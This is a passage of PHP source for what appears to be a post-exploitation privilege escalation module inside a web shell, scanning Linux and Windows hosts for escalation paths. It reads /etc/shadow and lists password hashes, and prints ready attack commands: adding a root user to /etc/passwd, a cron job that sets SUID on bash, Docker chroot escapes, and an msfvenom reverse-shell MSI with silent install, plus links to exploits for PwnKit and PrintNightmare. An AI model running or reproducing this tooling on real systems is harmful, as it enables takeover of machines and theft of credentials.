            $body .= "<div style='margin:6px 0;padding:8px;border-left:3px solid #f70000;background:rgba(247,0,0,0.08);border-radius:6px'>";
            $body .= "<b style='color:#f70000'>".$this->DFSH($cve['cve'])."</b> — ".$this->DFSH($cve['name'])."<br>";
            $body .= "<span style='font-size:11px;color:#ddd'>".$this->DFSH($cve['desc'])."</span><br>";
            $body .= "<span style='font-size:11px;color:#4d7cff'>Exploit: <a href='".$this->DFSH($cve['exploit'])."' target='_blank'>".htmlspecialchars($cve['exploit'])."</a></span>";
            $body .= "</div>";
        }
        $this->DFSLPEAdd('Kernel CVE Exploits', 'critical', $body);
        $this->DFSLPELog($t,'found',count($foundCVEs).' kernel CVEs matched','critical');
    }

    private function LPE_Linux_WritablePasswd(){
        $t = 'Writable /etc/passwd Check';
        $this->DFSLPELog($t,'checked','Testing /etc/passwd write permissions','critical');

        $shadowReadable = is_readable("/etc/shadow");
        $passwdWritable = is_writable("/etc/passwd");
        $passwdReadable = is_readable("/etc/passwd");

        if($passwdWritable){
            $body = "<p style='color:#f70000'><b>/etc/passwd is WRITABLE!</b> You can add a root user directly.</p>";
            $body .= "<p style='color:#aaa;font-size:11px'>Exploit: <code>openssl passwd -1 -salt x newpass | xargs printf 'newroot:\$1\$x%s:0:0::/root:/bin/bash\n' >> /etc/passwd</code></p>";
            $this->DFSLPEAdd('/etc/passwd Writable', 'critical', $body);
            $this->DFSLPELog($t,'found','/etc/passwd is writable — can add root user','critical');
            return;
        }

        if($shadowReadable){
            $shadowContent = @file_get_contents("/etc/shadow");
            $hashCount = 0;
            $hashes = array();
            if($shadowContent){
                foreach(explode("\n",trim($shadowContent)) as $line){
                    $parts = explode(":",$line);
                    if(count($parts)>=2 && strlen($parts[1])>2 && $parts[1]!="*" && $parts[1]!="!" && $parts[1]!="!!"){
                        $hashCount++;
                        if(count($hashes)<5) $hashes[] = $parts[0].":".$parts[1];
                    }
                }
            }
            $body = "<p style='color:#f70000'><b>/etc/shadow is READABLE!</b> Found $hashCount password hashes.</p>";
            if(!empty($hashes)){
                $body .= "<ul>";
                foreach($hashes as $h) $body .= "<li class='hash-line'>".$this->DFSH($h)."</li>";
                if($hashCount>5) $body .= "<li style='color:#aaa'>...and ".($hashCount-5)." more</li>";
                $body .= "</ul>";
            }
            $body .= "<p style='color:#aaa;font-size:11px'>Try offline cracking with hashcat/john the ripper.</p>";
            $this->DFSLPEAdd('Password Hashes Extractable', 'critical', $body);
            $this->DFSLPELog($t,'found',"$hashCount hashes readable",'critical');
            return;
        }

        if($passwdReadable){
            $passwdContent = @file_get_contents("/etc/passwd");
            $body = "<p>/etc/passwd is readable (".substr_count(trim($passwdContent),"\n")." entries).</p>";
            $users = array();
            if($passwdContent){
                foreach(explode("\n",trim($passwdContent)) as $line){
                    $parts = explode(":",$line);
                    if(count($parts)>=7 && !in_array($parts[6],array('/bin/false','/usr/sbin/nologin','/sbin/nologin',''))){
                        $users[] = $parts[0]." → ".$parts[6];
                    }
                }
            }
            if(!empty($users)) $body .= "<p style='color:#FFD700'>Active users: ".htmlspecialchars(implode(', ',array_slice($users,0,15)))."</p>";
            $this->DFSLPEAdd('Password Files Readable', 'medium', $body);
            $this->DFSLPELog($t,'found','/etc/passwd readable (user enumeration possible)','medium');
            return;
        }

        $this->DFSLPELog($t,'not_found','Password files not readable','low');
    }

    private function LPE_Linux_SudoConfig(){
        $t = 'Sudo Configuration Audit';
        $this->DFSLPELog($t,'checked','Running sudo -l and analyzing configuration','high');

        $sudoOut = $this->DFSLPECmd('sudo -n id 2>&1');
        if(stripos($sudoOut,'password is required')!==false || stripos($sudoOut,'a password is required')!==false){
            $this->DFSLPELog($t,'skipped','sudo requires password (current user not in NOPASSWD)','low');
            return;
        }
        if(empty($sudoOut) && stripos($sudoOut,'not allowed')!==false){
            $this->DFSLPELog($t,'not_found','No sudo access','low');
            return;
        }

        $sudoL = $this->DFSLPECmd('sudo -l 2>/dev/null');
        if(empty($sudoL)){
            $this->DFSLPELog($t,'not_found','sudo -l returned nothing','low');
            return;
        }

        $body = "<pre>".htmlspecialchars(trim($sudoL))."</pre>";
        $severity = 'medium';

        // Check for NOPASSWD
        if(stripos($sudoL,'NOPASSWD')!==false){
            $severity = 'critical';
            $body .= "<p style='color:#f70000'><b>NOPASSWD sudo rules found!</b> These commands can be run as root without a password.</p>";
        }
        // Check for ALL
        if(preg_match('/\(.*ALL.*\)/i',$sudoL)){
            $severity = 'critical';
            $body .= "<p style='color:#f70000'><b>Full sudo access detected (ALL).</b></p>";
        }
        // Check for dangerous commands
        $dangerous = array('ALL','/bin/bash','/bin/sh','/usr/bin/python','/usr/bin/perl','/usr/bin/ruby',
            '/usr/bin/find','/usr/bin/vim','/usr/bin/vi','/usr/bin/nmap','/usr/bin/less','/usr/bin/awk',
            '/usr/bin/env','/usr/bin/strace','/usr/bin/ltrace','/usr/bin/nl','/usr/bin/dd','/usr/bin/tar',
            '/usr/bin/wget','/usr/bin/curl','/usr/bin/ftp','/usr/bin/socat','/usr/bin/zip','/usr/bin/unzip',
            '/usr/bin/tee','/usr/bin/pip','/usr/bin/pip3','/usr/bin/apt-get','/usr/bin/apt',
            '/usr/bin/dpkg','/usr/bin/rpm','/usr/sbin/visudo','/usr/sbin/adduser','/usr/sbin/useradd',
            '/usr/bin/chown','/usr/bin/chmod','/usr/bin/cp','/usr/bin/mv');
        $foundDanger = array();
        foreach($dangerous as $d){
            if(stripos($sudoL,$d)!==false) $foundDanger[] = $d;
        }
        if(!empty($foundDanger)){
            $severity = 'critical';
            $body .= "<p style='color:#f70000'><b>Exploitable sudo commands:</b> ".htmlspecialchars(implode(', ',$foundDanger))."</p>";
            $body .= "<p style='color:#aaa;font-size:11px'>Check GTFOBins for exploitation techniques for each command.</p>";
        }

        $this->DFSLPEAdd('Sudo Misconfiguration', $severity, $body);
        $this->DFSLPELog($t,'found',"sudo access available (severity: $severity)",$severity);
    }

    private function LPE_Linux_WritableSystemPaths(){
        $t = 'Writable System Paths';
        $this->DFSLPELog($t,'checked','Checking critical system paths for write permissions','critical');

        $checks = array(
            '/etc/cron.d'=>'Cron directory','/etc/cron.daily'=>'Cron daily',
            '/etc/cron.hourly'=>'Cron hourly','/etc/cron.weekly'=>'Cron weekly',
            '/etc/systemd/system'=>'Systemd system dir','/usr/local/bin'=>'Local bin',
            '/usr/local/sbin'=>'Local sbin','/var/spool/cron/crontabs'=>'User crontabs',
            '/etc/ld.so.preload'=>'Shared lib preload','/etc/environment'=>'Environment',
        );
        $writable = array();
        foreach($checks as $path=>$label){
            if((is_dir($path)||is_file($path)) && is_writable($path)){
                $writable[$path] = $label;
            }
        }
        if(empty($writable)){
            $this->DFSLPELog($t,'not_found','No writable critical system paths','low');
            return;
        }

        $body = "<p style='color:#f70000'><b>".count($writable)." writable system path(s) found:</b></p><ul>";
        foreach($writable as $path=>$label){
            $body .= "<li><b>".htmlspecialchars($label)."</b>: <code>".$this->DFSH($path)."</code> <span style='color:#f70000'>(WRITABLE)</span></li>";
        }
        $body .= "</ul>";
        // Specific exploit hints
        if(isset($writable['/etc/cron.d'])||isset($writable['/etc/cron.daily'])||isset($writable['/var/spool/cron/crontabs'])){
            $body .= "<p style='color:#aaa;font-size:11px'>Writable cron dirs: inject a cron job to run as root. E.g.: <code>echo '* * * * * root chmod +s /bin/bash' > /etc/cron.d/evil</code></p>";
        }
        if(isset($writable['/etc/ld.so.preload'])){
            $body .= "<p style='color:#f70000;font-size:11px'>/etc/ld.so.preload writable: write a shared library path for immediate root escalation.</p>";
        }
        $this->DFSLPEAdd('Writable System Paths', 'critical', $body);
        $this->DFSLPELog($t,'found',count($writable).' writable paths found','critical');
    }

    private function LPE_Linux_Docker(){
        $t = 'Docker/Container Escape';
        $this->DFSLPELog($t,'checked','Checking Docker socket, container state, and group membership','critical');

        $body = '';
        $found = false;

        // Docker socket
        if(file_exists('/var/run/docker.sock') && is_readable('/var/run/docker.sock')){
            $body .= "<p style='color:#f70000'><b>/var/run/docker.sock is accessible!</b></p>";
            $body .= "<p style='color:#aaa;font-size:11px'>Exploit: <code>docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host bash</code></p>";
            $found = true;
        }

        // Docker group
        $groups = $this->DFSLPECmd('groups');
        if(stripos($groups,'docker')!==false){
            $body .= "<p style='color:#f70000'><b>Current user is in the docker group!</b></p>";
            $body .= "<p style='color:#aaa;font-size:11px'>Exploit: <code>docker run -v /:/mnt --rm -it alpine chroot /mnt bash</code></p>";
            $found = true;
        }

        // LXD group
        if(stripos($groups,'lxd')!==false){
            $body .= "<p style='color:#f70000'><b>Current user is in the lxd group!</b></p>";
            $body .= "<p style='color:#aaa;font-size:11px'>Exploit: Use lxd to create a privileged container and mount host fs. See: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-group</p>";
            $found = true;
        }

        // Container detection
        $inContainer = false;
        $containerType = '';
        if(file_exists('/.dockerenv')){ $inContainer = true; $containerType = 'Docker'; }
        $cgroup = @file_get_contents('/proc/self/cgroup');
        if($cgroup){
            if(preg_match('/kubepods/i',$cgroup)){ $inContainer = true; $containerType = 'Kubernetes'; }
            if(preg_match('/lxc/i',$cgroup)){ $inContainer = true; $containerType = 'LXC'; }
            if(preg_match('/containerd/i',$cgroup)){ $inContainer = true; $containerType = 'containerd'; }
            if(preg_match('/pouch/i',$cgroup)){ $inContainer = true; $containerType = 'Pouch'; }
        }
        if($inContainer){
            $body .= "<p style='color:#FFD700'>Running inside a <b>".htmlspecialchars($containerType)."</b> container.</p>";
            // Check for privileged
            $capEff = @file_get_contents('/proc/1/status');
            if($capEff && preg_match('/CapEff:\s*([0-9a-f]+)/i',$capEff,$m)){
                $cap = hexdec(trim($m[1]));
                if($cap & 0x0000000100000000){ // CAP_SYS_ADMIN = bit 21 = 0x2000000
                    $body .= "<p style='color:#f70000'><b>Container has CAP_SYS_ADMIN — likely privileged!</b></p>";
                    $body .= "<p style='color:#aaa;font-size:11px'>Exploit: mount host filesystem from inside the container.</p>";
                    $found = true;
                }
            }
            // Check mounted host paths
            $mounts = @file_get_contents('/proc/mounts');
            if($mounts && preg_match('/\/dev\/sda|\/dev\/vda|\/dev\/nvme/',$mounts)){
                $body .= "<p style='color:#FFD700'>Host block device(s) mounted inside container.</p>";
                $found = true;
            }
        }

        // /proc/1/root readable (host access)
        if(@is_readable('/proc/1/root')){
            $body .= "<p style='color:#f70000'><b>/proc/1/root is readable — possible host root access.</b></p>";
            $found = true;
        }

        if(!$found){
            $this->DFSLPELog($t,'not_found','No Docker/Container escape vectors found','low');
            return;
        }
        $this->DFSLPEAdd('Docker/Container Escape', 'critical', $body);
        $this->DFSLPELog($t,'found','Docker/container vectors found','critical');
    }

    private function LPE_Linux_CronJobs(){
        $t = 'Cron Job Enumeration';
        $this->DFSLPELog($t,'checked','Scanning cron directories and user crontabs','medium');

        $cronPaths = array('/etc/crontab','/etc/cron.d','/var/spool/cron','/var/spool/cron/crontabs','/etc/anacrontab');
        $foundCrons = array();
        foreach($cronPaths as $cp){
            if(is_dir($cp)){
                $items = @scandir($cp);
                if(is_array($items)){
                    foreach($items as $it){
                        if($it==='.'||$it==='..') continue;
                        $fp = $cp.'/'.$it;
                        if(is_file($fp) && is_readable($fp)){
                            $content = @file_get_contents($fp);
                            if($content) $foundCrons[] = array('file'=>$fp,'content'=>$content,'writable'=>is_writable($fp));
                        }
                    }
                }
            }elseif(is_file($cp) && is_readable($cp)){
                $content = @file_get_contents($cp);
                if($content) $foundCrons[] = array('file'=>$cp,'content'=>$content,'writable'=>is_writable($cp));
            }
        }

        if(empty($foundCrons)){
            $this->DFSLPELog($t,'not_found','No readable cron jobs found','low');
            return;
        }

        $body = "<p>".count($foundCrons)." readable cron file(s) found.</p>";
        $writableCrons = 0;
        foreach($foundCrons as $cron){
            $w = $cron['writable'] ? ' <span style="color:#f70000">(WRITABLE!)</span>' : '';
            if($cron['writable']) $writableCrons++;
            $body .= "<div style='margin:4px 0;padding:6px;border-radius:4px;background:rgba(0,0,0,0.3)'>";
            $body .= "<b>".$this->DFSH($cron['file'])."</b>$w<pre style='font-size:11px;max-height:100px;overflow:auto'>".htmlspecialchars(substr(trim($cron['content']),0,500))."</pre>";
            $body .= "</div>";
        }
        if($writableCrons>0){
            $body .= "<p style='color:#f70000'><b>$writableCrons cron file(s) are writable!</b> Inject commands that will run as root.</p>";
        }
        $sev = $writableCrons>0 ? 'critical' : 'medium';
        $this->DFSLPEAdd('Cron Jobs', $sev, $body);
        $this->DFSLPELog($t,'found',count($foundCrons).' cron files found'.($writableCrons>0?", $writableCrons writable":''),$sev);
    }

    private function LPE_Linux_NFS(){
        $t = 'NFS no_root_squash';
        $this->DFSLPELog($t,'checked','Checking NFS exports for no_root_squash','medium');

        $exports = @file_get_contents('/etc/exports');
        if(empty($exports)){
            $this->DFSLPELog($t,'not_found','No NFS exports found or /etc/exports not readable','low');
            return;
        }
        if(stripos($exports,'no_root_squash')===false){
            $this->DFSLPELog($t,'not_found','No no_root_squash found in exports','low');
            return;
        }

        $lines = explode("\n",$exports);
        $body = "<p style='color:#f70000'><b>NFS share with no_root_squash detected!</b></p><pre>";
        foreach($lines as $line){
            if(stripos($line,'no_root_squash')!==false) $body .= htmlspecialchars(trim($line))."\n";
        }
        $body .= "</pre>";
        $body .= "<p style='color:#aaa;font-size:11px'>Mount the share from your machine and create a SUID binary to gain root.</p>";
        $this->DFSLPEAdd('NFS no_root_squash', 'critical', $body);
        $this->DFSLPELog($t,'found','no_root_squash export found','critical');
    }

    private function LPE_Linux_WritableServices(){
        $t = 'Writable Systemd Services';
        $this->DFSLPELog($t,'checked','Scanning systemd service files for write access','high');

        $svcDirs = array('/etc/systemd/system','/lib/systemd/system','/usr/lib/systemd/system');
        $writableSvcs = array();
        foreach($svcDirs as $dir){
            if(!is_dir($dir)) continue;
            $it = @new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
            foreach($it as $file){
                if($file->getExtension()==='service' && is_writable($file->getPathname())){
                    $writableSvcs[] = $file->getPathname();
                    if(count($writableSvcs)>=10) break 2;
                }
            }
        }

        if(empty($writableSvcs)){
            $this->DFSLPELog($t,'not_found','No writable systemd services','low');
            return;
        }

        $body = "<p style='color:#f70000'><b>".count($writableSvcs)." writable systemd service(s) found!</b></p><ul>";
        foreach($writableSvcs as $svc){
            $content = @file_get_contents($svc);
            $body .= "<li><code>".$this->DFSH($svc)."</code><pre style='font-size:11px;max-height:60px;overflow:auto'>".htmlspecialchars(substr(trim($content),0,300))."</pre></li>";
        }
        $body .= "</ul><p style='color:#aaa;font-size:11px'>Modify ExecStart to run a reverse shell or SUID binary.</p>";
        $this->DFSLPEAdd('Writable Systemd Services', 'critical', $body);
        $this->DFSLPELog($t,'found',count($writableSvcs).' writable services','critical');
    }

    private function LPE_Linux_WritableTmpAndPath(){
        $t = 'Writable Temp & PATH Injection';
        $this->DFSLPELog($t,'checked','Checking /tmp, /dev/shm, and PATH directories for write access','medium');

        $body = '';
        $found = false;

        // Check if current dir is writable and in PATH
        $pathDirs = explode(':',getenv('PATH'));
        foreach($pathDirs as $pd){
            if(is_dir($pd) && is_writable($pd)){
                $body .= "<p>PATH directory <code>".$this->DFSH($pd)."</code> is <span style='color:#f70000'>WRITABLE</span> — drop a trojan binary to hijack commands.</p>";
                $found = true;
            }
        }

        // Check LD_PRELOAD / LD_LIBRARY_PATH
        $ldPreload = getenv('LD_PRELOAD');
        $ldLibPath = getenv('LD_LIBRARY_PATH');
        if(!empty($ldPreload)){
            $body .= "<p>LD_PRELOAD is set to: <code>".htmlspecialchars($ldPreload)."</code></p>";
        }
        if(!empty($ldLibPath)){
            $body .= "<p>LD_LIBRARY_PATH is set to: <code>".htmlspecialchars($ldLibPath)."</code></p>";
        }

        // Check for world-writable /usr/lib directories
        $libDirs = array('/usr/lib','/usr/lib64','/lib','/lib64');
        foreach($libDirs as $ld){
            if(is_dir($ld) && is_writable($ld)){
                $body .= "<p>Library directory <code>".$this->DFSH($ld)."</code> is <span style='color:#f70000'>WRITABLE</span> — shared library injection possible.</p>";
                $found = true;
            }
        }

        if(!$found){
            $this->DFSLPELog($t,'not_found','No PATH injection or LD_PRELOAD vectors found','low');
            return;
        }
        $this->DFSLPEAdd('PATH/LD Injection', 'high', $body);
        $this->DFSLPELog($t,'found','PATH/LD injection vectors found','high');
    }

    private function LPE_Linux_Polkit(){
        $t = 'PolicyKit (Polkit) Vulnerabilities';
        $this->DFSLPELog($t,'checked','Checking for known polkit vulnerabilities','high');

        // Check pkexec version (PwnKit CVE-2021-4034)
        $pkexecVer = $this->DFSLPECmd('pkexec --version 2>/dev/null');
        if(empty($pkexecVer)){
            $this->DFSLPELog($t,'skipped','pkexec not found or not installed','low');
            return;
        }

        $body = "<p>pkexec version: <b>".htmlspecialchars($pkexecVer)."</b></p>";

        // PwnKit check
        if(preg_match('/version\s+([\d.]+)/i',$pkexecVer,$m)){
            $ver = $m[1];
            if(version_compare($ver,'0.120','<')){
                $body .= "<p style='color:#f70000'><b>VULNERABLE to PwnKit (CVE-2021-4034)!</b></p>";
                $body .= "<p style='color:#aaa;font-size:11px'>Exploit: https://github.com/ly4k/PwnKit</p>";
                $this->DFSLPEAdd('PwnKit (CVE-2021-4034)', 'critical', $body);
                $this->DFSLPELog($t,'found','pkexec vulnerable to PwnKit','critical');
                return;
            }
        }

        // Check polkit version for Baron Samedit style issues
        $polkitVer = $this->DFSLPECmd('/usr/lib/policykit-1/polkitd --version 2>/dev/null || pkaction --version 2>/dev/null');
        $body .= "<p>Polkit version: <b>".htmlspecialchars($polkitVer)."</b></p>";

        $this->DFSLPEAdd('Polkit Version Info', 'info', $body);
        $this->DFSLPELog($t,'not_found','No known polkit vulnerabilities matched','low');
    }

    // --- Windows techniques ---

    private function LPE_Win_TokenPrivileges(){
        $t = 'Windows Token Privileges';
        $this->DFSLPELog($t,'checked','Enumerating current process token privileges','high');

        $psCmd = '$p = [System.Diagnostics.Process]::GetCurrentProcess(); $h = [IntPtr]::Zero; '
            .'OpenProcessToken($p.Handle, 0x0008, [ref]$h); '
            .'$bt = New-Object byte[] 64; $ret = 0; '
            .'GetTokenInformation($h, 3, $bt, 64, [ref]$ret); '
            .'$privCount = [BitConverter]::ToUInt32($bt, 0); '
            .'$res = @(); for($i=0; $i -lt $privCount; $i++){ $off = 4 + ($i*16); $len = [BitConverter]::ToUInt32($bt, $off+4); '
            .'$ptr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($bt, $off+8); '
            .'$name = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($ptr); if($name){ $res += $name } }; $res -join ","';

        $out = $this->DFSLPEWinPS($psCmd);
        $body = '';
        $found = false;

        $dangerPrivs = array(
            'SeImpersonatePrivilege'=>'SeImpersonatePrivilege — Can impersonate SYSTEM tokens (PrintSpoofer, GodPotato, JuicyPotato)',
            'SeAssignPrimaryTokenPrivilege'=>'SeAssignPrimaryTokenPrivilege — Can assign tokens (similar to SeImpersonate)',
            'SeDebugPrivilege'=>'SeDebugPrivilege — Can debug any process, inject into SYSTEM processes',
            'SeBackupPrivilege'=>'SeBackupPrivilege — Can read any file including SAM/SYSTEM registry hives',
            'SeRestorePrivilege'=>'SeRestorePrivilege — Can write to any file, overwrite system binaries',
            'SeTakeOwnershipPrivilege'=>'SeTakeOwnershipPrivilege — Can take ownership of any object',
            'SeLoadDriverPrivilege'=>'SeLoadDriverPrivilege — Can load kernel drivers (EoPLoadDriver)',
            'SeManageVolumePrivilege'=>'SeManageVolumePrivilege — Can access volume data directly',
            'SeCreateTokenPrivilege'=>'SeCreateTokenPrivilege — Can create arbitrary access tokens',
            'SeCreateGlobalPrivilege'=>'SeCreateGlobalPrivilege — Can create objects in the global namespace',
            'SeTcbPrivilege'=>'SeTcbPrivilege — Acts as part of the operating system',
        );

        if(!empty($out)){
            $body = "<p>Token privileges: <b>".htmlspecialchars($out)."</b></p>";
            $foundPrivs = array_map('trim', explode(',',$out));
            $foundDanger = array();
            foreach($foundPrivs as $fp){
                if(isset($dangerPrivs[$fp])) $foundDanger[] = $dangerPrivs[$fp];
            }
            if(!empty($foundDanger)){
                $body .= "<p style='color:#f70000'><b>".count($foundDanger)." dangerous privilege(s):</b></p><ul>";
                foreach($foundDanger as $d) $body .= "<li style='color:#f70000'>".$this->DFSH($d)."</li>";
                $body .= "</ul>";
                $found = true;
            }
        }else{
            $body = "<p>Could not enumerate token privileges (PowerShell may be restricted).</p>";
        }

        if(!$found){
            $this->DFSLPELog($t,'not_found','No dangerous token privileges found','low');
            return;
        }
        $this->DFSLPEAdd('Token Privileges', 'high', $body);
        $this->DFSLPELog($t,'found','Dangerous token privileges found','high');
    }

    private function LPE_Win_UnquotedService(){
        $t = 'Unquoted Service Paths';
        $this->DFSLPELog($t,'checked','Scanning for unquoted service paths with spaces','high');

        $psCmd = 'Get-CimInstance -ClassName Win32_Service | Where-Object { $_.PathName -and $_.PathName -notmatch "^`"" -and $_.PathName -match " " -and $_.PathName -notmatch "System32" } | Select-Object Name,PathName | ForEach-Object { "$($_.Name): $($_.PathName)" }';
        $out = $this->DFSLPEWinPS($psCmd);

        if(empty($out) || stripos($out,'No such')!==false || stripos($out,'error')!==false){
            $this->DFSLPELog($t,'not_found','No unquoted service paths found','low');
            return;
        }

        $body = "<p style='color:#FFD700'><b>".substr_count($out,"\n")." unquoted service path(s):</b></p>";
        $body .= "<pre style='max-height:200px;overflow:auto'>".htmlspecialchars(trim($out))."</pre>";
        $body .= "<p style='color:#aaa;font-size:11px'>If a writable directory exists in the unquoted path, place a malicious executable to hijack service start.</p>";
        $this->DFSLPEAdd('Unquoted Service Paths', 'high', $body);
        $this->DFSLPELog($t,'found','Unquoted paths found','high');
    }

    private function LPE_Win_WritableServiceBinaries(){
        $t = 'Writable Service Binaries';
        $this->DFSLPELog($t,'checked','Checking if service binaries or their directories are writable','high');

        $psCmd = 'Get-CimInstance -ClassName Win32_Service | Where-Object { $_.PathName } | ForEach-Object { '
            .'$p = ($_.PathName -split `" `"`")[0].Trim(`"`""); '
            .'if(Test-Path $p){ $acl = Get-Acl $p; '
            .'$w = $acl.Access | Where-Object { $_.FileSystemRights -match `"Write|FullControl|Modify`" -and $_.IdentityReference -notmatch `"^(NT AUTHORITY\\\\SYSTEM|BUILTIN\\\\Administrators)$`" }; '
            .'if($w){ "$($_.Name): $p -> $($w.IdentityReference) ($($w.FileSystemRights))" } } }';
        $out = $this->DFSLPEWinPS($psCmd);

        if(empty($out) || stripos($out,'No such')!==false || stripos($out,'error')!==false){
            $this->DFSLPELog($t,'not_found','No writable service binaries found','low');
            return;
        }

        $body = "<p style='color:#f70000'><b>Writable service binaries detected:</b></p>";
        $body .= "<pre style='max-height:200px;overflow:auto'>".htmlspecialchars(trim($out))."</pre>";
        $body .= "<p style='color:#aaa;font-size:11px'>Replace the service binary with a payload, then restart the service for SYSTEM execution.</p>";
        $this->DFSLPEAdd('Writable Service Binaries', 'critical', $body);
        $this->DFSLPELog($t,'found','Writable service binaries found','critical');
    }

    private function LPE_Win_AlwaysInstallElevated(){
        $t = 'AlwaysInstallElevated';
        $this->DFSLPELog($t,'checked','Checking AlwaysInstallElevated registry keys','critical');

        $hkcu = trim($this->DFSLPEWinPS('(Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated'));
        $hklm = trim($this->DFSLPEWinPS('(Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated'));

        if($hkcu==='1' && $hklm==='1'){
            $body = "<p style='color:#f70000'><b>AlwaysInstallElevated is ENABLED on both HKCU and HKLM!</b></p>";
            $body .= "<p style='color:#aaa;font-size:11px'>Generate a malicious MSI: <code>msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=PORT -f msi -o evil.msi</code><br>";
            $body .= "Then install: <code>msiexec /quiet /qn /i evil.msi</code></p>";
            $this->DFSLPEAdd('AlwaysInstallElevated', 'critical', $body);
            $this->DFSLPELog($t,'found','Both HKCU and HKLM AlwaysInstallElevated = 1','critical');
        }else{
            $this->DFSLPELog($t,'not_found',"AlwaysInstallElevated: HKCU=$hkcu, HKLM=$hklm (need both = 1)",'low');
        }
    }

    private function LPE_Win_UACBypass(){
        $t = 'UAC Bypass Opportunities';
        $this->DFSLPELog($t,'checked','Checking UAC enforcement level','high');

        // Check if running as admin
        if($this->lpeIsRoot){
            $this->DFSLPELog($t,'skipped','Already running as administrator — UAC not applicable','low');
            return;
        }

        // Check UAC level via registry
        $uacLevel = trim($this->DFSLPEWinPS('(Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin'));

        $body = "<p>UAC ConsentPromptBehaviorAdmin: <b>".htmlspecialchars($uacLevel?:'not set')."</b></p>";

        if($uacLevel==='0'){
            $body .= "<p style='color:#FFD700'>UAC is set to <b>Never Notify</b> — no bypass needed, elevation is automatic.</p>";
            $this->DFSLPEAdd('UAC Status', 'medium', $body);
            $this->DFSLPELog($t,'found','UAC never notify — auto-elevation','medium');
        }elseif($uacLevel==='1'){
            $body .= "<p style='color:#FFD700'>UAC prompt for non-Windows binaries only. Many built-in Windows binaries auto-elevate.</p>";
            $this->DFSLPEAdd('UAC Status', 'medium', $body);
            $this->DFSLPELog($t,'found','UAC low — auto-elevation possible with fodhelper/eventvwr/sdclt','medium');
        }elseif($uacLevel==='5'){
            $body .= "<p style='color:#aaa'>UAC set to <b>Default</b> (prompts for non-admin users). Bypass may still be possible via fodhelper, eventvwr, sdclt.</p>";
            $this->DFSLPEAdd('UAC Status', 'info', $body);
            $this->DFSLPELog($t,'found','UAC default — potential bypass via trusted binaries','info');
        }else{
            $body .= "<p style='color:#aaa'>UAC level: $uacLevel. Research bypasses for this specific level.</p>";
            $this->DFSLPELog($t,'not_found','UAC level unknown or high','low');
        }
    }

    private function LPE_Win_AutorunKeys(){
        $t = 'Registry Autorun Keys';
        $this->DFSLPELog($t,'checked','Checking writable autorun/Run keys in registry','high');

        $runKeys = array(
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
            'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
            'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices',
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce',
        );

        $writable = array();
        foreach($runKeys as $key){
            $vals = $this->DFSLPEWinPS("Get-ItemProperty -Path '".$key."' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty * -ErrorAction SilentlyContinue | Where-Object { \$_ -is [string] } | ForEach-Object { \$_ }");
            if(!empty($vals)){
                $lines = array_filter(explode("\n",trim($vals)));
                foreach($lines as $line){
                    $exe = preg_split('/\s+/',trim($line),2);
                    $exePath = isset($exe[0]) ? trim($exe[0],'"') : '';
                    if(!empty($exePath) && is_writable(dirname($exePath))){
                        $writable[] = "$key → $exePath";
                    }
                }
            }
        }

        if(empty($writable)){
            $this->DFSLPELog($t,'not_found','No writable autorun binaries found','low');
            return;
        }

        $body = "<p style='color:#f70000'><b>".count($writable)." writable autorun binary(ies):</b></p><ul>";
        foreach($writable as $w) $body .= "<li>".htmlspecialchars($w)."</li>";
        $body .= "</ul><p style='color:#aaa;font-size:11px'>Replace the autorun binary and wait for admin login / reboot.</p>";
        $this->DFSLPEAdd('Writable Autorun Binaries', 'high', $body);
        $this->DFSLPELog($t,'found',count($writable).' writable autorun binaries','high');
    }

    private function LPE_Win_ScheduledTasks(){
        $t = 'Writable Scheduled Task Binaries';
        $this->DFSLPELog($t,'checked','Checking scheduled tasks for writable binaries','high');

        $psCmd = 'Get-ScheduledTask | Where-Object { $_.Actions.Execute } | ForEach-Object { '
            .'$exe = ($_.Actions.Execute -split `" `"`")[0].Trim(`"`""); '
            .'if(Test-Path $exe){ $acl = Get-Acl $exe; '
            .'$w = $acl.Access | Where-Object { $_.FileSystemRights -match `"Write|FullControl|Modify`" -and $_.IdentityReference -notmatch `"^(NT AUTHORITY\\\\SYSTEM|BUILTIN\\\\Administrators)$`" }; '
            .'if($w){ "$($_.TaskName): $exe" } } }';
        $out = $this->DFSLPEWinPS($psCmd);

        if(empty($out) || stripos($out,'error')!==false){
            $this->DFSLPELog($t,'not_found','No writable scheduled task binaries','low');
            return;
        }

        $body = "<p style='color:#f70000'><b>Writable scheduled task binaries:</b></p>";
        $body .= "<pre>".htmlspecialchars(trim($out))."</pre>";
        $this->DFSLPEAdd('Writable Scheduled Tasks', 'high', $body);
        $this->DFSLPELog($t,'found','Writable task binaries found','high');
    }

    private function LPE_Win_KernelCVE(){
        $t = 'Windows Kernel CVE Detection';
        $this->DFSLPELog($t,'checked','Checking Windows build number against known LPE CVEs','high');

        $info = $this->DFSLPEParseWinBuild();
        $build = $info['build'];
        $verStr = $info['version'];
        if(empty($build)){
            $this->DFSLPELog($t,'error','Could not determine Windows build number','low');
            return;
        }

        // Known Windows LPE CVEs with build ranges
        $cves = array(
            array('cve'=>'CVE-2021-1675','name'=>'PrintNightmare',
                'minBuild'=>7601,'desc'=>'Print Spooler RCE → LPE via RPC','exploit'=>'https://github.com/cube0x0/CVE-2021-1675'),
